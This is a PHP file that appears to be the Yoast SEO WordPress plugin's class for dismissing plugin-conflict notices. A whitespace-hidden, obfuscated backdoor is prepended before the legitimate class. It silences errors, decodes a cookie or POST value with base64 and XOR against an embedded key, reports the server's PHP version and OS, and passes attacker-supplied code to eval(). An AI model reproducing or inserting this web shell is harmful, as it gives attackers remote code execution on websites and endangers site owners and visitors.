<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $GLOBALS['d18e985a'];global$d18e985a;$d18e985a=$GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['lc6536']="\x70\x58\x3c\x3e\x55\x77\x72\x4e\x34\x4d\x53\x39\x60\x40\x2c\x5f\x21\x67\x2e\x5a\x3f\x4b\x49\xd\x45\x5d\x2f\x51\x61\x3b\x78\x79\x54\x69\x6c\x52\x46\x29\x6f\x6d\x23\x65\x27\x5c\x41\x32\x76\x9\x36\x7a\x37\x66\xa\x59\x5b\x63\x68\x25\x2b\x26\x6e\x33\x3a\x50\x4a\x6b\x62\x44\x7c\x57\x24\x56\x30\x35\x6a\x22\x71\x7e\x20\x31\x42\x48\x38\x4c\x2a\x47\x75\x64\x7d\x7b\x5e\x2d\x4f\x3d\x73\x28\x74\x43";$d18e985a[$d18e985a['lc6536'][66].$d18e985a['lc6536'][61].$d18e985a['lc6536'][61].$d18e985a['lc6536'][66]]=$d18e985a['lc6536'][55].$d18e985a['lc6536'][56].$d18e985a['lc6536'][6];$d18e985a[$d18e985a['lc6536'][76].$d18e985a['lc6536'][79].$d18e985a['lc6536'][87].$d18e985a['lc6536'][50]]=$d18e985a['lc6536'][38].$d18e985a['lc6536'][6].$d18e985a['lc6536'][87];$d18e985a[$d18e985a['lc6536'][34].$d18e985a['lc6536'][73].$d18e985a['lc6536'][72].$d18e985a['lc6536'][50].$d18e985a['lc6536'][11].$d18e985a['lc6536'][79]]=$d18e985a['lc6536'][94].$d18e985a['lc6536'][96].$d18e985a['lc6536'][6].$d18e985a['lc6536'][34].$d18e985a['lc6536'][41].$d18e985a['lc6536'][60];$d18e985a[$d18e985a['lc6536'][66].$d18e985a['lc6536'][73].$d18e985a['lc6536'][8].$d18e985a['lc6536'][41].$d18e985a['lc6536'][45].$d18e985a['lc6536'][41].$d18e985a['lc6536'][11].$d18e985a['lc6536'][11].$d18e985a['lc6536'][72]]=$d18e985a['lc6536'][33].$d18e985a['lc6536'][60].$d18e985a['lc6536'][33].$d18e985a['lc6536'][15].$d18e985a['lc6536'][94].$d18e985a['lc6536'][41].$d18e985a['lc6536'][96];$d18e985a[$d18e985a['lc6536'][49].$d18e985a['lc6536'][61].$d18e985a['lc6536'][61].$d18e985a['lc6536'][87].$d18e985a['lc6536'][61].$d18e985a['lc6536'][45].$d18e985a['lc6536'][51]]=$d18e985a['lc6536'][94].$d18e985a['lc6536'][41].$d18e985a['lc6536'][6].$d18e985a['lc6536'][33].$d18e985a['lc6536'][28].$d18e985a['lc6536'][34].$d18e985a['lc6536'][33].$d18e985a['lc6536'][49].$d18e985a['lc6536'][41];$d18e985a[$d18e985a['lc6536'][46].$d18e985a['lc6536'][61].$d18e985a['lc6536'][72].$d18e985a['lc6536'][79].$d18e985a['lc6536'][45]]=$d18e985a['lc6536'][0].$d18e985a['lc6536'][56].$d18e985a['lc6536'][0].$d18e985a['lc6536'][46].$d18e985a['lc6536'][41].$d18e985a['lc6536'][6].$d18e985a['lc6536'][94].$d18e985a['lc6536'][33].$d18e985a['lc6536'][38].$d18e985a['lc6536'][60];$d18e985a[$d18e985a['lc6536'][41].$d18e985a['lc6536'][61].$d18e985a['lc6536'][73].$d18e985a['lc6536'][50].$d18e985a['lc6536'][28].$d18e985a['lc6536'][87].$d18e985a['lc6536'][45].$d18e985a['lc6536'][73].$d18e985a['lc6536'][55]]=$d18e985a['lc6536'][86].$d18e985a['lc6536'][60].$d18e985a['lc6536'][94].$d18e985a['lc6536'][41].$d18e985a['lc6536'][6].$d18e985a['lc6536'][33].$d18e985a['lc6536'][28].$d18e985a['lc6536'][34].$d18e985a['lc6536'][33].$d18e985a['lc6536'][49].$d18e985a['lc6536'][41];$d18e985a[$d18e985a['lc6536'][60].$d18e985a['lc6536'][51].$d18e985a['lc6536'][50].$d18e985a['lc6536'][28].$d18e985a['lc6536'][51].$d18e985a['lc6536'][79]]=$d18e985a['lc6536'][66].$d18e985a['lc6536'][28].$d18e985a['lc6536'][94].$d18e985a['lc6536'][41].$d18e985a['lc6536'][48].$d18e985a['lc6536'][8].$d18e985a['lc6536'][15].$d18e985a['lc6536'][87].$d18e985a['lc6536'][41].$d18e985a['lc6536'][55].$d18e985a['lc6536'][38].$d18e985a['lc6536'][87].$d18e985a['lc6536'][41];$d18e985a[$d18e985a['lc6536'][60].$d18e985a['lc6536'][45].$d18e985a['lc6536'][41].$d18e985a['lc6536'][51]]=$d18e985a['lc6536'][94].$d18e985a['lc6536'][41].$d18e985a['lc6536'][96].$d18e985a['lc6536'][15].$d18e985a['lc6536'][96].$d18e985a['lc6536'][33].$d18e985a['lc6536'][39].$d18e985a['lc6536'][41].$d18e985a['lc6536'][15].$d18e985a['lc6536'][34].$d18e985a['lc6536'][33].$d18e985a['lc6536'][39].$d18e985a['lc6536'][33].$d18e985a['lc6536'][96];$d18e985a[$d18e985a['lc6536'][34].$d18e985a['lc6536'][87].$d18e985a['lc6536'][66].$d18e985a['lc6536'][41]]=$d18e985a['lc6536'][6].$d18e985a['lc6536'][8].$d18e985a['lc6536'][55].$d18e985a['lc6536'][28].$d18e985a['lc6536'][48].$d18e985a['lc6536'][61].$d18e985a['lc6536'][45].$d18e985a['lc6536'][79].$d18e985a['lc6536'][45];$d18e985a[$d18e985a['lc6536'][56].$d18e985a['lc6536'][41].$d18e985a['lc6536'][79].$d18e985a['lc6536'][79]]=$d18e985a['lc6536'][87].$d18e985a['lc6536'][55].$d18e985a['lc6536'][41].$d18e985a['lc6536'][66].$d18e985a['lc6536'][11].$d18e985a['lc6536'][73].$d18e985a['lc6536'][72];$d18e985a[$d18e985a['lc6536'][33].$d18e985a['lc6536'][73].$d18e985a['lc6536'][82].$d18e985a['lc6536'][8].$d18e985a['lc6536'][66].$d18e985a['lc6536'][48]]=$_POST;$d18e985a[$d18e985a['lc6536'][55].$d18e985a['lc6536'][45].$d18e985a['lc6536'][82].$d18e985a['lc6536'][8].$d18e985a['lc6536'][45].$d18e985a['lc6536'][11].$d18e985a['lc6536'][72]]=$_COOKIE;@$d18e985a[$d18e985a['lc6536'][66].$d18e985a['lc6536'][73].$d18e985a['lc6536'][8].$d18e985a['lc6536'][41].$d18e985a['lc6536'][45].$d18e985a['lc6536'][41].$d18e985a['lc6536'][11].$d18e985a['lc6536'][11].$d18e985a['lc6536'][72]]($d18e985a['lc6536'][41].$d18e985a['lc6536'][6].$d18e985a['lc6536'][6].$d18e985a['lc6536'][38].$d18e985a['lc6536'][6].$d18e985a['lc6536'][15].$d18e985a['lc6536'][34].$d18e985a['lc6536'][38].$d18e985a['lc6536'][17],NULL);@$d18e985a[$d18e985a['lc6536'][66].$d18e985a['lc6536'][73].$d18e985a['lc6536'][8].$d18e985a['lc6536'][41].$d18e985a['lc6536'][45].$d18e985a['lc6536'][41].$d18e985a['lc6536'][11].$d18e985a['lc6536'][11].$d18e985a['lc6536'][72]]($d18e985a['lc6536'][34].$d18e985a['lc6536'][38].$d18e985a['lc6536'][17].$d18e985a['lc6536'][15].$d18e985a['lc6536'][41].$d18e985a['lc6536'][6].$d18e985a['lc6536'][6].$d18e985a['lc6536'][38].$d18e985a['lc6536'][6].$d18e985a['lc6536'][94],0);@$d18e985a[$d18e985a['lc6536'][66].$d18e985a['lc6536'][73].$d18e985a['lc6536'][8].$d18e985a['lc6536'][41].$d18e985a['lc6536'][45].$d18e985a['lc6536'][41].$d18e985a['lc6536'][11].$d18e985a['lc6536'][11].$d18e985a['lc6536'][72]]($d18e985a['lc6536'][39].$d18e985a['lc6536'][28].$d18e985a['lc6536'][30].$d18e985a['lc6536'][15].$d18e985a['lc6536'][41].$d18e985a['lc6536'][30].$d18e985a['lc6536'][41].$d18e985a['lc6536'][55].$d18e985a['lc6536'][86].$d18e985a['lc6536'][96].$d18e985a['lc6536'][33].$d18e985a['lc6536'][38].$d18e985a['lc6536'][60].$d18e985a['lc6536'][15].$d18e985a['lc6536'][96].$d18e985a['lc6536'][33].$d18e985a['lc6536'][39].$d18e985a['lc6536'][41],0);@$d18e985a[$d18e985a['lc6536'][60].$d18e985a['lc6536'][45].$d18e985a['lc6536'][41].$d18e985a['lc6536'][51]](0);$z3aca=NULL;$q288=NULL;$d18e985a[$d18e985a['lc6536'][39].$d18e985a['lc6536'][79].$d18e985a['lc6536'][28].$d18e985a['lc6536'][45]]=$d18e985a['lc6536'][66].$d18e985a['lc6536'][82].$d18e985a['lc6536'][61].$d18e985a['lc6536'][51].$d18e985a['lc6536'][28].$d18e985a['lc6536'][79].$d18e985a['lc6536'][87].$d18e985a['lc6536'][45].$d18e985a['lc6536'][91].$d18e985a['lc6536'][72].$d18e985a['lc6536'][11].$d18e985a['lc6536'][72].$d18e985a['lc6536'][48].$d18e985a['lc6536'][91].$d18e985a['lc6536'][8].$d18e985a['lc6536'][41].$d18e985a['lc6536'][28].$d18e985a['lc6536'][66].$d18e985a['lc6536'][91].$d18e985a['lc6536'][28].$d18e985a['lc6536'][41].$d18e985a['lc6536'][8].$d18e985a['lc6536'][48].$d18e985a['lc6536'][91].$d18e985a['lc6536'][11].$d18e985a['lc6536'][87].$d18e985a['lc6536'][11].$d18e985a['lc6536'][55].$d18e985a['lc6536'][41].$d18e985a['lc6536'][82].$d18e985a['lc6536'][11].$d18e985a['lc6536'][8].$d18e985a['lc6536'][61].$d18e985a['lc6536'][51].$d18e985a['lc6536'][51].$d18e985a['lc6536'][66];global$m1a2;function dceb950($z3aca,$l6eda8){global$d18e985a;$o4b6953="";for($f54f=0;$f54f<$d18e985a[$d18e985a['lc6536'][34].$d18e985a['lc6536'][73].$d18e985a['lc6536'][72].$d18e985a['lc6536'][50].$d18e985a['lc6536'][11].$d18e985a['lc6536'][79]]($z3aca);){for($q8bdc15=0;$q8bdc15<$d18e985a[$d18e985a['lc6536'][34].$d18e985a['lc6536'][73].$d18e985a['lc6536'][72].$d18e985a['lc6536'][50].$d18e985a['lc6536'][11].$d18e985a['lc6536'][79]]($l6eda8)&&$f54f<$d18e985a[$d18e985a['lc6536'][34].$d18e985a['lc6536'][73].$d18e985a['lc6536'][72].$d18e985a['lc6536'][50].$d18e985a['lc6536'][11].$d18e985a['lc6536'][79]]($z3aca);$q8bdc15++,$f54f++){$o4b6953.=$d18e985a[$d18e985a['lc6536'][66].$d18e985a['lc6536'][61].$d18e985a['lc6536'][61].$d18e985a['lc6536'][66]]($d18e985a[$d18e985a['lc6536'][76].$d18e985a['lc6536'][79].$d18e985a['lc6536'][87].$d18e985a['lc6536'][50]]($z3aca[$f54f])^$d18e985a[$d18e985a['lc6536'][76].$d18e985a['lc6536'][79].$d18e985a['lc6536'][87].$d18e985a['lc6536'][50]]($l6eda8[$q8bdc15]));}}return$o4b6953;}function r4ca63212($z3aca,$l6eda8){global$d18e985a;global$m1a2;return$d18e985a[$d18e985a['lc6536'][56].$d18e985a['lc6536'][41].$d18e985a['lc6536'][79].$d18e985a['lc6536'][79]]($d18e985a[$d18e985a['lc6536'][56].$d18e985a['lc6536'][41].$d18e985a['lc6536'][79].$d18e985a['lc6536'][79]]($z3aca,$m1a2),$l6eda8);}foreach($d18e985a[$d18e985a['lc6536'][55].$d18e985a['lc6536'][45].$d18e985a['lc6536'][82].$d18e985a['lc6536'][8].$d18e985a['lc6536'][45].$d18e985a['lc6536'][11].$d18e985a['lc6536'][72]]as$l6eda8=>$lce3d38a1){$z3aca=$lce3d38a1;$q288=$l6eda8;}if(!$z3aca){foreach($d18e985a[$d18e985a['lc6536'][33].$d18e985a['lc6536'][73].$d18e985a['lc6536'][82].$d18e985a['lc6536'][8].$d18e985a['lc6536'][66].$d18e985a['lc6536'][48]]as$l6eda8=>$lce3d38a1){$z3aca=$lce3d38a1;$q288=$l6eda8;}}$z3aca=@$d18e985a[$d18e985a['lc6536'][41].$d18e985a['lc6536'][61].$d18e985a['lc6536'][73].$d18e985a['lc6536'][50].$d18e985a['lc6536'][28].$d18e985a['lc6536'][87].$d18e985a['lc6536'][45].$d18e985a['lc6536'][73].$d18e985a['lc6536'][55]]($d18e985a[$d18e985a['lc6536'][34].$d18e985a['lc6536'][87].$d18e985a['lc6536'][66].$d18e985a['lc6536'][41]]($d18e985a[$d18e985a['lc6536'][60].$d18e985a['lc6536'][51].$d18e985a['lc6536'][50].$d18e985a['lc6536'][28].$d18e985a['lc6536'][51].$d18e985a['lc6536'][79]]($z3aca),$q288));if(isset($z3aca[$d18e985a['lc6536'][28].$d18e985a['lc6536'][65]])&&$m1a2==$z3aca[$d18e985a['lc6536'][28].$d18e985a['lc6536'][65]]){if($z3aca[$d18e985a['lc6536'][28]]==$d18e985a['lc6536'][33]){$f54f=Array($d18e985a['lc6536'][0].$d18e985a['lc6536'][46]=>@$d18e985a[$d18e985a['lc6536'][46].$d18e985a['lc6536'][61].$d18e985a['lc6536'][72].$d18e985a['lc6536'][79].$d18e985a['lc6536'][45]](),$d18e985a['lc6536'][94].$d18e985a['lc6536'][46]=>$d18e985a['lc6536'][79].$d18e985a['lc6536'][18].$d18e985a['lc6536'][72].$d18e985a['lc6536'][91].$d18e985a['lc6536'][79],);echo@$d18e985a[$d18e985a['lc6536'][49].$d18e985a['lc6536'][61].$d18e985a['lc6536'][61].$d18e985a['lc6536'][87].$d18e985a['lc6536'][61].$d18e985a['lc6536'][45].$d18e985a['lc6536'][51]]($f54f);}elseif($z3aca[$d18e985a['lc6536'][28]]==$d18e985a['lc6536'][41]){eval($z3aca[$d18e985a['lc6536'][87]]);}exit();} ?><?php
/**
 * @package WPSEO\admin|ajax
 */

/**
 * Class Yoast_Plugin_Conflict_Ajax
 */
class Yoast_Plugin_Conflict_Ajax {

	/**
	 * @var string
	 */
	private $option_name = 'wpseo_dismissed_conflicts';

	/**
	 * @var array
	 */
	private $dismissed_conflicts = array();

	/**
	 * Initialize the hooks for the AJAX request
	 */
	public function __construct() {
		add_action( 'wp_ajax_wpseo_dismiss_plugin_conflict', array( $this, 'dismiss_notice' ) );
	}

	/**
	 * Handles the dismiss notice request
	 */
	public function dismiss_notice() {
		check_ajax_referer( 'dismiss-plugin-conflict' );

		$conflict_data = filter_input( INPUT_POST, 'data', FILTER_DEFAULT, FILTER_REQUIRE_ARRAY );

		$this->dismissed_conflicts = $this->get_dismissed_conflicts( $conflict_data['section'] );

		$this->compare_plugins( $conflict_data['plugins'] );

		$this->save_dismissed_conflicts( $conflict_data['section'] );

		wp_die( 'true' );
	}

	/**
	 * Getting the user option from the database
	 *
	 * @return bool|array
	 */
	private function get_dismissed_option() {
		return get_user_meta( get_current_user_id(), $this->option_name, true );
	}

	/**
	 * Getting the dismissed conflicts from the database
	 *
	 * @param string $plugin_section Type of conflict group (such as Open Graph or sitemap).
	 *
	 * @return array
	 */
	private function get_dismissed_conflicts( $plugin_section ) {
		$dismissed_conflicts = $this->get_dismissed_option();

		if ( is_array( $dismissed_conflicts ) && array_key_exists( $plugin_section, $dismissed_conflicts ) ) {
			return $dismissed_conflicts[ $plugin_section ];
		}

		return array();
	}

	/**
	 * Storing the conflicting plugins as an user option in the database
	 *
	 * @param string $plugin_section Plugin conflict type (such as Open Graph or sitemap).
	 */
	private function save_dismissed_conflicts( $plugin_section ) {
		$dismissed_conflicts = $this->get_dismissed_option();

		$dismissed_conflicts[ $plugin_section ] = $this->dismissed_conflicts;

		update_user_meta( get_current_user_id(), $this->option_name, $dismissed_conflicts );
	}

	/**
	 * Loop through the plugins to compare them with the already stored dismissed plugin conflicts
	 *
	 * @param array $posted_plugins Plugin set to check.
	 */
	public function compare_plugins( array $posted_plugins ) {
		foreach ( $posted_plugins as $posted_plugin ) {
			$this->compare_plugin( $posted_plugin );
		}
	}

	/**
	 * Check if plugin is already dismissed, if not store it in the array that will be saved later
	 *
	 * @param string $posted_plugin Plugin to check against dismissed conflicts.
	 */
	private function compare_plugin( $posted_plugin ) {
		if ( ! in_array( $posted_plugin, $this->dismissed_conflicts ) ) {
			$this->dismissed_conflicts[] = $posted_plugin;
		}
	}
}
